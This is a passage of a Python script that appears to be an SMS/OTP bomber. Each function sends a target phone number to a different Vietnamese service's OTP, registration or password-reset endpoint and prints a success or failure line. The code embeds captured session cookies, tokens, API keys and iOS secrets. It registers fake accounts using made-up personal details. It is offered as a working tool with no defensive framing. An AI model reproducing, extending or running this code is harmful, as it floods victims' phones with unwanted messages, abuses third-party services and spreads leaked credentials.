        'bundleid': 'com.vkids.ios.abctiengviet',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'platform': '1',
        'app_info': '2.13.0',
        'User-Agent': 'VkidsABC/2.13.0.1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'country_code': 'VN',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    data = {
        'phone': sdt[1:10],
        'appKey': 'Ydfa76f765SA46HAA56sHFDMF8K4S5IK',
        'app_id': 'com.vkids.ios.abctiengviet',
    }

    try:
        response = requests.post('http://payment.api.deltago.com/api/auth/get-otp-vmg', headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VKIDS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VKIDS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def mytv():
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Access-Control-Allow-Origin': '*',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Macaddress': '1efca607-2227-610e-9234-109156bec4fb',
        'Origin': 'https://mytv.com.vn',
        'Referer': 'https://mytv.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'device_model': 'Browser',
        'device_type': 127,
        'email': '',
        'login_type': '1',
        'phone': sdt,
        'type': '1',
    }

    try:
        response = requests.post(
            'https://apigw.mytv.vn/api/v1/authen-handle/sendOTP?&uuid=64e8c0d4-c73b-4158-8513-ca4519d9e826',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MYTV | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MYTV | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def bsmart(): # check
    headers = {
        'accept': '*/*',
        'accept-language': 'en',
        'content-type': 'application/json',
        'mm-token': '',
        'origin': 'https://bsmartvina.com',
        'priority': 'u=1, i',
        'referer': 'https://bsmartvina.com/',
        'refreshtoken': '71ca4f0dbb2117c9c4427737b8dc6046:d4a01dc37b0f8fb16f7c938b22f2048e000dddd92229ced197eef3d38f31722b877cd7937e8b760456683965e3e43bcd53d713be5b40956c680b336220c217c4c660cf7c3c059e8d39e874d9001feae8bb5dca03a6d1062c1a07d05945c4621adf77fc56c711fe33dd9d4267a950869da01a8abb95ba0ae4feba01c316ee8fe2b855481aa36d31bb8077b6a41d4b9a3c4b088043ed894f1e16587c3060b0d388e7b583d9d563c5c6eb5a062faac6481db53bb178e013bcd93687a13239a4d6555617b29309dcc0661fc932b4b0ca484b4e91909dfd1aaa6d32b04302683e8b90103f937fb862b08feadb7778e3fee443bfe64521cc1475b75a43d4c0dc323fa53c0c1164c51f18a97db7e0535b9f40b7e21a88cbfa617e635dcef14e099c31c4',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'token': '71ca4f0dbb2117c9c4427737b8dc6046:d4a01dc37b0f8fb16f7c938b22f2048e000dddd92229ced197eef3d38f31722b877cd7937e8b760456683965e3e43bcd53d713be5b40956c680b336220c217c4c660cf7c3c059e8d39e874d9001feae8bb5dca03a6d1062c1a07d05945c4621adf77fc56c711fe33dd9d4267a950869da01a8abb95ba0ae4feba01c316ee8fe2b855481aa36d31bb8077b6a41d4b9a3c4b088043ed894f1e16587c3060b0d388e7b583d9d563c5c6eb5a062faac6481db569e7e2125df39561f53b37faadc740e21067fc12f4bda57c68d8b2037c0331d37168e4590e11c019d591c9f9a88cf578bb886607d853374869e1aba822b7e44c7dc673da63dfe211b16f5385f96ba900ded1b17d06f24b7fc6d4968b76184e2876fcbe6c39302b02737a23cb295a8a',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://api-v1.mmvietnam.com:5000/ecom/fox-gw/send-otp-login', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("B-S MART | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("B-S MART | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def cathaylife():
    cookies = {
        'TS01f67c5d': '0110512fd75d28cd8dca1406809047fa9a58228de78dc79d02c4c49bc535883d25523c8e55da9b48b384d5b6079c27bc2d0868d555',
        'JSESSIONID': 'ewQEmhrEJszcSFBivrHPUCP8.06283f0e-f7d1-36ef-bc27-6779aba32e74',
        'dtCookies05g7k3y': 'v_4_srv_1_sn_394FDFD95DC05D18FC363F15F943EBB9_perc_100000_ol_0_mul_1_app-3Aea7c4b59f27d43eb_1',
        'BIGipServerB2C_http': '!exmKDAWgt+BvyVjRrhDcHTnwa9KJ8dX1VrymLFuvhZFmAgzYJv4C7yoyyLs5rrnuzL+6BJJLRW387w==',
        'INITSESSIONID': '027279fa9c4b49c532cab7766a507b45',
        'TS0173f952': '0110512fd7e9d9e1305cd27c245c835d237f161078489a7eebc0df2bcd5fc3a63b9c863bc5d4c3d04d0054eac231fbe1c7155b0344',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        # 'Cookie': 'TS01f67c5d=0110512fd75d28cd8dca1406809047fa9a58228de78dc79d02c4c49bc535883d25523c8e55da9b48b384d5b6079c27bc2d0868d555; JSESSIONID=ewQEmhrEJszcSFBivrHPUCP8.06283f0e-f7d1-36ef-bc27-6779aba32e74; dtCookies05g7k3y=v_4_srv_1_sn_394FDFD95DC05D18FC363F15F943EBB9_perc_100000_ol_0_mul_1_app-3Aea7c4b59f27d43eb_1; BIGipServerB2C_http=!exmKDAWgt+BvyVjRrhDcHTnwa9KJ8dX1VrymLFuvhZFmAgzYJv4C7yoyyLs5rrnuzL+6BJJLRW387w==; INITSESSIONID=027279fa9c4b49c532cab7766a507b45; TS0173f952=0110512fd7e9d9e1305cd27c245c835d237f161078489a7eebc0df2bcd5fc3a63b9c863bc5d4c3d04d0054eac231fbe1c7155b0344',
        'Origin': 'https://www.cathaylife.com.vn',
        'Referer': 'https://www.cathaylife.com.vn/CPWeb/portal/register',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phone': sdt,
        'email': '22312fsas36@gmail.com',
        'LINK_FROM': 'signUp2',
        'CUSTOMER_NAME': 'Tran Quang Trinh',
        'memberID': '',
        'POL_HOLDER_NUM': 'undefined',
        'LANGS': 'vi_VN',
    }

    try:
        response = requests.post(
            'https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/sendOTP',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("CATHAY LIFE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("CATHAY LIFE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def cathayliferesend():
    cookies = {
        'TS01f67c5d': '0110512fd75d28cd8dca1406809047fa9a58228de78dc79d02c4c49bc535883d25523c8e55da9b48b384d5b6079c27bc2d0868d555',
        'JSESSIONID': 'ewQEmhrEJszcSFBivrHPUCP8.06283f0e-f7d1-36ef-bc27-6779aba32e74',
        'dtCookies05g7k3y': 'v_4_srv_1_sn_394FDFD95DC05D18FC363F15F943EBB9_perc_100000_ol_0_mul_1_app-3Aea7c4b59f27d43eb_1',
        'BIGipServerB2C_http': '!exmKDAWgt+BvyVjRrhDcHTnwa9KJ8dX1VrymLFuvhZFmAgzYJv4C7yoyyLs5rrnuzL+6BJJLRW387w==',
        'INITSESSIONID': '027279fa9c4b49c532cab7766a507b45',
        'TS0173f952': '0110512fd7e9d9e1305cd27c245c835d237f161078489a7eebc0df2bcd5fc3a63b9c863bc5d4c3d04d0054eac231fbe1c7155b0344',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        # 'Cookie': 'TS01f67c5d=0110512fd75d28cd8dca1406809047fa9a58228de78dc79d02c4c49bc535883d25523c8e55da9b48b384d5b6079c27bc2d0868d555; JSESSIONID=ewQEmhrEJszcSFBivrHPUCP8.06283f0e-f7d1-36ef-bc27-6779aba32e74; dtCookies05g7k3y=v_4_srv_1_sn_394FDFD95DC05D18FC363F15F943EBB9_perc_100000_ol_0_mul_1_app-3Aea7c4b59f27d43eb_1; BIGipServerB2C_http=!exmKDAWgt+BvyVjRrhDcHTnwa9KJ8dX1VrymLFuvhZFmAgzYJv4C7yoyyLs5rrnuzL+6BJJLRW387w==; INITSESSIONID=027279fa9c4b49c532cab7766a507b45; TS0173f952=0110512fd7e9d9e1305cd27c245c835d237f161078489a7eebc0df2bcd5fc3a63b9c863bc5d4c3d04d0054eac231fbe1c7155b0344',
        'Origin': 'https://www.cathaylife.com.vn',
        'Referer': 'https://www.cathaylife.com.vn/CPWeb/portal/register',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'memberMap': f'{{"userName":"22312fsas36@gmail.com","password":"123123aA@","birthday":"15/12/1999","certificateNumber":"001305049886","phone":"{sdt}","email":"22312fsas36@gmail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"Tran Quang Trinh"}}',
        'OTP_TYPE': 'P',
        'LANGS': 'vi_VN',
    }

    try:
        response = requests.post(
            'https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("CATHAY RESEND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("CATHAY RESEND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def prepedu():
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'origin': 'https://prepedu.com',
        'priority': 'u=1, i',
        'referer': 'https://prepedu.com/',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'x-forwarded-for': '171.224.177.243, 172.17.29.253',
        'x-locale': 'vi',
    }

    params = ''

    json_data = {
        'phone': sdt_chuyen_doi,
    }

    try:
        response = requests.post('https://accounts.prep.vn/api/v1/auth/phone-otp/login', params=params, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PREPEDU | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PREPEDU | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def bigm():
    cookies = {
        'bigm_session': 'eyJpdiI6Im9lZHJxSElcL3Zydk5VYnlxVGE2TUtRPT0iLCJ2YWx1ZSI6ImhnXC9QUW9hSkR6TEdMUm5NYXVXang5VXhHZGhFeGo2MWVZV1FXNGU0aWhcL1NBdTFtTXlXSWhZclRxQlNVMno3a3p6Z3BacmJFYzExdFZxV1wvN3lqa1FyMFBCamtaU0NSakN6QkdaWlJSQTkrd3pBQml5ejYrRmZOSnFSKzY2NmJJIiwibWFjIjoiYWZjYmFmZWQyODY0MTgwZTkxNGNlY2Q1NDcxMjM0NDViMzYxNGFmMzk2N2RhZTViYzYxYWIyZTBjNTYwMjY3ZCJ9',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'bigm_session=eyJpdiI6Im9lZHJxSElcL3Zydk5VYnlxVGE2TUtRPT0iLCJ2YWx1ZSI6ImhnXC9QUW9hSkR6TEdMUm5NYXVXang5VXhHZGhFeGo2MWVZV1FXNGU0aWhcL1NBdTFtTXlXSWhZclRxQlNVMno3a3p6Z3BacmJFYzExdFZxV1wvN3lqa1FyMFBCamtaU0NSakN6QkdaWlJSQTkrd3pBQml5ejYrRmZOSnFSKzY2NmJJIiwibWFjIjoiYWZjYmFmZWQyODY0MTgwZTkxNGNlY2Q1NDcxMjM0NDViMzYxNGFmMzk2N2RhZTViYzYxYWIyZTBjNTYwMjY3ZCJ9',
        'Origin': 'https://base.bigm.vn',
        'Referer': 'https://base.bigm.vn/register/step2?id=367',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://base.bigm.vn/api/send-sms/opt', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BIGM | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BIGM | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def homedy():
    headers = {
        'Host': 'sso.homedy.com',
        'content-type': 'application/json',
        'x-client-bundle': 'com.Homedy.Mobile',
        'accept': 'application/json',
        'x-client-version': '3.7.1',
        'x-client-app-code': 'homedy',
        'accept-language': 'vi-VN,vi;q=0.9',
        'x-client-locale': 'vi',
        'user-agent': 'HomedyApp/241015 CFNetwork/1494.0.7 Darwin/23.4.0',
        'x-device-id': 'EF7DF7A4-A404-448F-81D8-3B98952F7428',
    }

    json_data = {
        'Mobile': sdt,
        'TypeId': 3,
    }

    try:
        response = requests.post('https://sso.homedy.com/User/SendOTP', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HOMEDY | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HOMEDY | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def timnha24h(): # 400, ap
    headers = {
        'Host': 'www.googleapis.com',
        'x-client-version': 'iOS/FirebaseSDK/6.9.2/FirebaseCore-iOS',
        'content-type': 'application/json',
        'accept': '*/*',
        'x-ios-bundle-identifier': 'com.catviet.ios.timnha',
        'user-agent': 'FirebaseAuth.iOS/6.9.2 com.catviet.ios.timnha/1.3.5 iPhone/17.4.1 hw/iPhone11_8',
        'accept-language': 'vi',
    }

    params = {
        'key': 'AIzaSyBu2xriAAvSJ-nMebiTUnbjZp-rsR2f-YU',
    }

    json_data = {
        'iosReceipt': 'AEFDNu8CWzthZW6rShlVCi-_3MD8SjcxcApimof0FvMUt8zh929rET3YlSMPxjQukCoVwbuiY7tdg47GFORtJ_QYPJ0T4jZFl6mtaIn4dDZBGiyV54JlCq-nLUFeQ2lRoKPB',
        'iosSecret': 'gsrH5aQEeLmNJtaA',
        'phoneNumber': sdt_chuyen_doi,
    }

    try:
        response = requests.post(
            'https://www.googleapis.com/identitytoolkit/v3/relyingparty/sendVerificationCode',
            params=params,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TIMNHA24H | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TIMNHA24H | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def atmnha():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'origin': 'https://atmnha.vn',
        'priority': 'u=1, i',
        'referer': 'https://atmnha.vn/',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
    }

    json_data = {
        'operationName': 'sendCode',
        'variables': {
            'phone': sdt,
            'type': 'signUp',
            'identifier': 'identifier',
        },
        'query': 'mutation sendCode($phone: String!, $type: SendVerificationCodeType, $identifier: String!) {\n  sendCode(phone: $phone, type: $type, identifier: $identifier) {\n    payload\n    success\n    msg\n    __typename\n  }\n}',
    }

    try:
        response = requests.post('https://api.realtech247.com/v1/users/graphql', headers=headers, json=json_data)
        response.raise_for_status()
        print("ATMNHA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("ATMNHA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ivnd(): #ap, propfit
    cookies = {
        '_ga_EWW4NCHEL2': 'GS1.1.1735995911.1.1.1735996122.0.0.0',
        'JSESSIONID': 'F5C9EFEE420E60D5289D474126EA8121',
        '_ga': 'GA1.1.500739119.1735995911',
        'vnds-uuid': 'ae042dab-dc42-4d4b-b37d-cd27b4ed7786',
        'vnds-uuid-d': '1735995910174',
        'TBMCookie_11462157618146033510': '141010001735995909oyWMI0Hdkc9LeXfVb1X1/dqBYjA=',
        '___utmvm': '###########',
        'redirect-app': 'propfit-app',
    }

    headers = {
        'Host': 'id.ivnd.com.vn',
        'Accept': '*/*',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Fetch-Site': 'same-origin',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Sec-Fetch-Mode': 'cors',
        'Content-Type': 'application/json',
        'Origin': 'https://id.ivnd.com.vn',
        'User-Agent': 'AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75',
        'Referer': 'https://id.ivnd.com.vn/register',
        'Sec-Fetch-Dest': 'empty',
        # 'Cookie': '_ga_EWW4NCHEL2=GS1.1.1735995911.1.1.1735996122.0.0.0; JSESSIONID=F5C9EFEE420E60D5289D474126EA8121; _ga=GA1.1.500739119.1735995911; vnds-uuid=ae042dab-dc42-4d4b-b37d-cd27b4ed7786; vnds-uuid-d=1735995910174; TBMCookie_11462157618146033510=141010001735995909oyWMI0Hdkc9LeXfVb1X1/dqBYjA=; ___utmvm=###########; redirect-app=propfit-app',
    }

    json_data = {
        'domain': 'IVND',
        'fullName': 'duc tam',
        'userName': sdt,
        'password': '123123aA@',
        'referralBy': '',
    }


    response = requests.post('https://id.ivnd.com.vn/register/create', cookies=cookies, headers=headers, json=json_data)

    cookies = {
        '_ga_EWW4NCHEL2': 'GS1.1.1737256064.1.1.1737256099.0.0.0',
        'JSESSIONID': '6DD89B0302BF48F69500A0ED1DC4D996',
        '_ga': 'GA1.1.1268446941.1737256064',
        'vnds-uuid': '2259dd94-ec89-4898-82b9-8f167e5620e0',
        'vnds-uuid-d': '1737256063128',
        'TBMCookie_11462157618146033510': '759076001737256062BQIzsm9y55myiRte8f2u1kNrMQo=',
        '___utmvm': '###########',
        'redirect-app': 'propfit-app',
    }

    headers = {
        'Host': 'id.ivnd.com.vn',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Fetch-Site': 'same-origin',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Sec-Fetch-Mode': 'cors',
        'Accept': '*/*',
        'Origin': 'https://id.ivnd.com.vn',
        'User-Agent': 'AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75',
        'Referer': f'https://id.ivnd.com.vn/forgot-password/reset?userName={sdt}&phone={sdt}',
        # 'Cookie': '_ga_EWW4NCHEL2=GS1.1.1737256064.1.1.1737256099.0.0.0; JSESSIONID=6DD89B0302BF48F69500A0ED1DC4D996; _ga=GA1.1.1268446941.1737256064; vnds-uuid=2259dd94-ec89-4898-82b9-8f167e5620e0; vnds-uuid-d=1737256063128; TBMCookie_11462157618146033510=759076001737256062BQIzsm9y55myiRte8f2u1kNrMQo=; ___utmvm=###########; redirect-app=propfit-app',
        'Sec-Fetch-Dest': 'empty',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    params = {
        'username': sdt,
        'phone': sdt,
    }

    try:
        response = requests.post('https://id.ivnd.com.vn/forgot-password/send-otp-phone', params=params, cookies=cookies, headers=headers)
        response.raise_for_status()
        print("IVND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("IVND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
    

def dynaminds(): #ap
    headers = {
        'Host': 'api.dynaminds.vn',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Dynamic%20%20%20Hosting/1.4.1 CFNetwork/1494.0.7 Darwin/23.4.0',
        'Accept-Language': 'vi',
    }

    json_data = {
        'phone_number': sdt,
        'provider': 'self',
    }

    try:
        response = requests.post('https://api.dynaminds.vn/api/v1/oauth/register', headers=headers, json=json_data)
        response.raise_for_status()
        print("DYNAMINDS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("DYNAMINDS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def gicula(): #ap
    headers = {
        'Host': 'www.googleapis.com',
        'x-client-version': 'iOS/FirebaseSDK/10.7.0/FirebaseCore-iOS',
        'content-type': 'application/json',
        'accept': '*/*',
        'x-ios-bundle-identifier': 'com.gicula.gicula',
        'x-firebase-gmpid': '1:441632033845:ios:061257dd081a2a584d357c',
        'user-agent': 'FirebaseAuth.iOS/10.7.0 com.gicula.gicula/1.0.0 iPhone/17.4.1 hw/iPhone11_8',
        'accept-language': 'en',
    }

    params = {
        'key': 'AIzaSyArzuGpJSuQjY4BTPYKYvWbwhQyj-kqASc',
    }

    json_data = {
        'iosReceipt': 'AEFDNu8_Yf8zrW2KgVdtcYc_ZbgQNUfodc5BwLciW683p90mtt9WQ003Jl9exctAUMbeoOohuoh0F0dsLqXXl338Wr5lLApbo0PO2J5P89VV9WlqZbp7tYUie2rDvMw',
        'iosSecret': 'dQffunpOd3g77AuP',
        'phoneNumber': sdt_chuyen_doi,
    }

    try:
        response = requests.post(
            'https://www.googleapis.com/identitytoolkit/v3/relyingparty/sendVerificationCode',
            params=params,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()
        print("GICULA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GICULA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def dalatbds(): #ap
    headers = {
        'Host': 'www.googleapis.com',
        'content-type': 'application/json',
        'accept': '*/*',
        'x-client-version': 'iOS/FirebaseSDK/10.15.0/FirebaseCore-iOS',
        'x-firebase-appcheck': 'eyJraWQiOiJRNmZ5eEEiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjE2NTYxNzc3NjEyOmlvczpkMjRkODFiNzlmODY0ZWIzNGY4YjY5IiwiYXVkIjpbInByb2plY3RzXC8xNjU2MTc3NzYxMiIsInByb2plY3RzXC9kYWxhdC1iZHMiXSwicHJvdmlkZXIiOiJkZXZpY2VfY2hlY2tfYXBwX2F0dGVzdCIsImlzcyI6Imh0dHBzOlwvXC9maXJlYmFzZWFwcGNoZWNrLmdvb2dsZWFwaXMuY29tXC8xNjU2MTc3NzYxMiIsImV4cCI6MTczNjAwMDkwNywiaWF0IjoxNzM1OTk3MzA3LCJqdGkiOiIyMmpLTlhETlJEbEVHN2dQcUFLc2pwZy03V2toLU54M3pvMFZrXzdIcHJBIn0.hGOFfIogOZLZYQmb1v1SiUUoAgYh6iLp5glfR5uMtQQHVq2K-zhuJwxRtyxNfxsI89Mt3CXGU5m5ZiTc8m_VOVlJulyUTE5D0KP-y5ZsqycB7BJiH8IG7EGhS4uAOtvOHXCF-DFdPdvtR7pxMUHYkwIsxritRoLt7rTI8qCAhgTT4nEWRjjXvYmJo8B9dhF6_ExClj0Au9UioYnnhqYnDL8GTBzeO8entjmRlt9xbHTVbtTVcrFc0TWZj8xLnwTdnGkyDUxhvHRit2zE46mikcdw3I0gOJHqvF-uSw-7t66euJCKfYn0xeTMNU3Hg4vC1EiyN8Mhj_OdIYU6YAjpMG1w6XZ9RsIg2FNmiGeFZ4tRbiaw2hIeGHYLhMrq1GckOvrnA5PXoIg89W2lQ62Ye9P2xpGXEUc-CNqwt1n1o5Hu-fIetSG4qgNi1TgWbU7O8SPLS8Jw3fnLYezBcS2olhwu91HL65EkL7FUZwT5ldlDgBPvGjW2pdESH59y0FY1',
        'x-ios-bundle-identifier': 'com.dalatbds.ebroker',
        'accept-language': 'en',
        'user-agent': 'FirebaseAuth.iOS/10.15.0 com.dalatbds.ebroker/1.0.3 iPhone/17.4.1 hw/iPhone11_8',
        'x-firebase-gmpid': '1:16561777612:ios:d24d81b79f864eb34f8b69',
    }

    params = {
        'key': 'AIzaSyAoqJnJMlDHjlZuLPhvEVStfo4CvHax6t4',
    }

    json_data = {
        'iosReceipt': 'AEFDNu8BB_sx6nGU_12r9zfctn8oRGR-V4NtfLbaKq8cSlpNf-sxTq7ay1MGIKpVQ0HSdxN2zCLTdyQxWdBmnd79QA5iBwND6OFpe4uDdCLNZcQ2KojI71RNcnuZ_WkBsg',
        'iosSecret': 'S2e5YvF91lUom3pY',
        'phoneNumber': f'+84{sdt}',
    }

    try:
        response = requests.post(
            'https://www.googleapis.com/identitytoolkit/v3/relyingparty/sendVerificationCode',
            params=params,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()
        print("DALAT BDS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("DALAT BDS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def mocha2(): #ap
    headers = {
        'Host': 'hlvip.mocha.com.vn:80',
        'uuid': '9A886A24-F17E-4576-8C00-B8206C0A1FA1',
        'Accept': '*/*',
        'countryCode': 'VN',
        'Accept-Language': 'vi-VN;q=1',
        'languageCode': 'vi',
        'User-Agent': 'mocha/6.00 (iPhone; iOS 17.4.1; Scale/2.00)',
        'gender': '0',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    data = {
        'clientType': 'ios',
        'countryCode': 'VN',
        'device': 'iPhone 14',
        'os_version': 'iOS_18',
        'platform': 'ios',
        'revision': '11731',
        'username': sdt,
        'version': '6.00',
    }

    try:
        response = requests.post('http://hlvip.mocha.com.vn:80/ReengBackendBiz/genotp/v33', headers=headers, data=data)
        response.raise_for_status()
        print("MOCHA2 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MOCHA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def mocha35():
    headers = {
        'Host': 'v2sslapimocha35.mocha.com.vn',
        'uuid': '9A886A24-F17E-4576-8C00-B8206C0A1FA1',
        'Accept': '*/*',
        'APPNAME': 'MC35',
        'countryCode': 'VN',
        'languageCode': 'vi',
        'Accept-Language': 'vi-VN;q=1',
        'User-Agent': 'mocha/1.31 (iPhone; iOS 17.4.1; Scale/2.00)',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    data = {
        'clientType': 'ios',
        'countryCode': 'VN',
        'device': 'iPhone11,8',
        'os_version': 'iOS_17.4.1',
